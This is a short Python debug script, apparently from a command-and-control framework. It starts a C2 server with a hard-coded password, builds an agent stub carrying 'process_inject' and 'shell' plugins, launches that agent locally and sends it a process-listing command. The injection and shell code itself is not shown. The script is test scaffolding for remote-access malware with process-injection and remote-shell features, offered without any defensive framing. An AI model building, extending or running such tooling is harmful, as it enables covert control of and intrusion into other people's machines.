"""Debug process_inject plugin."""
import sys, os, time, threading, subprocess
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from server import C2Engine
from stub_generator import generate_stub
from plugins import PLUGIN_REGISTRY

port = 4448
engine = C2Engine(password="whisper_secret_key", port=port)
engine.set_callback("client_added", lambda c, i: print(f"CLIENT {c}"))
t = threading.Thread(target=engine.start, daemon=True)
t.start()
time.sleep(0.5)
print("Server started")

stub = generate_stub(["process_inject", "shell"], "127.0.0.1", port, "whisper_secret_key", 1)
sp = os.path.join(os.path.dirname(__file__), "build", "_test_pi.py")
os.makedirs(os.path.dirname(sp), exist_ok=True)
with open(sp, "w") as f:
    f.write(stub)

proc = subprocess.Popen(
    [sys.executable, sp],
    stdout=subprocess.PIPE, stderr=subprocess.PIPE
)
time.sleep(3)
print(f"Agent alive: {proc.poll() is None}")
print(f"Clients: {len(engine.clients)}")

if engine.clients:
    cid = list(engine.clients.keys())[0]
    resp = engine.interact(cid, {"type": "list_processes"})
    print(f"list_processes: {str(resp)[:300]}")
else:
    out, err = proc.communicate(timeout=2)
    if out:
        print(f"AGENT OUT: {out.decode(errors='replace')[:300]}")
    if err:
        print(f"AGENT ERR: {err.decode(errors='replace')[:300]}")

proc.kill()
engine.stop()
